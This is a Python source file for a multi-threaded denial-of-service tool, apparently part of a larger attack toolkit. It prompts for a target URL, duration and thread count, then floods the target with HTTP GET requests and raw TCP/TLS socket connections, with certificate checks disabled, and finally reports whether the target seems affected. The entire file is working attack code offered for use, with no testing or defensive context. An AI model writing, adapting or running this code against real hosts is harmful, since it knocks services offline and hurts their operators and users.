import threading
import socket
import ssl
import time
import random
import requests
from urllib.parse import urlparse
from utils.colors import Colors
from utils.animator import Animator

class DDoSAttack:
    def __init__(self):
        self.colors = Colors()
        self.animator = Animator()
        self.stats = {
            'requests': 0,
            'success': 0,
            'failed': 0,
            'start_time': 0
        }
        self.attacking = False
    
    def show_header(self):
        print(f"""
{self.colors.RED}
╔══════════════════════════════════════════════════╗
║               ENTERPRISE DDoS ATTACK            ║
║               ⚡ MULTI-VECTOR MODE ⚡            ║
╚══════════════════════════════════════════════════╝{self.colors.RESET}
        """)
    
    def run(self):
        self.show_header()
        
        target = input(f"{self.colors.CYAN}[?] Enter target URL: {self.colors.WHITE}").strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        duration = int(input(f"{self.colors.CYAN}[?] Attack duration (seconds): {self.colors.WHITE}") or 60)
        threads = int(input(f"{self.colors.CYAN}[?] Number of threads: {self.colors.WHITE}") or 500)
        
        print(f"\n{self.colors.RED}[!] INITIATING ENTERPRISE DDoS...{self.colors.RESET}")
        
        # Start attack
        self._start_attack(target, duration, threads)
    
    def _start_attack(self, target, duration, threads):
        parsed = urlparse(target)
        domain = parsed.netloc
        
        self.stats = {'requests': 0, 'success': 0, 'failed': 0, 'start_time': time.time()}
        self.attacking = True
        
        # Attack methods
        def http_flood():
            session = requests.Session()
            while self.attacking:
                try:
                    session.get(target, timeout=2, verify=False)
                    self.stats['requests'] += 1
                    self.stats['success'] += 1
                except:
                    self.stats['failed'] += 1
        
        def socket_attack():
            while self.attacking:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    port = 443 if target.startswith('https') else 80
                    
                    if port == 443:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=domain)
                    
                    sock.connect((domain, port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\n\r\n")
                    sock.close()
                    self.stats['success'] += 1
                except:
                    self.stats['failed'] += 1
        
        # Start threads
        for _ in range(threads // 2):
            threading.Thread(target=http_flood, daemon=True).start()
            threading.Thread(target=socket_attack, daemon=True).start()
        
        # Monitor
        def monitor():
            while self.attacking:
                elapsed = time.time() - self.stats['start_time']
                rps = self.stats['requests'] / elapsed if elapsed > 0 else 0
                print(f"\r{self.colors.RED}[ATTACK] Req: {self.stats['requests']} | RPS: {rps:.0f} | Time: {elapsed:.1f}s", end="")
                time.sleep(0.5)
        
        threading.Thread(target=monitor, daemon=True).start()
        
        # Run for duration
        print(f"\n{self.colors.YELLOW}[!] Attack running for {duration} seconds...{self.colors.RESET}")
        time.sleep(duration)
        self.attacking = False
        
        # Show results
        self._show_results(target)
    
    def _show_results(self, target):
        print(f"\n\n{self.colors.GREEN}[✓] ATTACK COMPLETED!{self.colors.RESET}")
        
        elapsed = time.time() - self.stats['start_time']
        print(f"{self.colors.CYAN}Total Requests: {self.colors.WHITE}{self.stats['requests']:,}")
        print(f"{self.colors.GREEN}Successful: {self.colors.WHITE}{self.stats['success']:,}")
        print(f"{self.colors.RED}Failed: {self.colors.WHITE}{self.stats['failed']:,}")
        print(f"{self.colors.CYAN}RPS: {self.colors.WHITE}{(self.stats['requests']/elapsed):.0f}")
        
        # Test target
        print(f"\n{self.colors.YELLOW}[!] Testing target...{self.colors.RESET}")
        try:
            start = time.time()
            requests.get(target, timeout=10, verify=False)
            response_time = time.time() - start
            print(f"{self.colors.CYAN}Target response time: {self.colors.WHITE}{response_time:.2f}s")
        except Exception as e:
            print(f"{self.colors.GREEN}[✓] Target may be affected: {e}{self.colors.RESET}")
        
        input(f"\n{self.colors.CYAN}[+] Press Enter to continue...{self.colors.RESET}")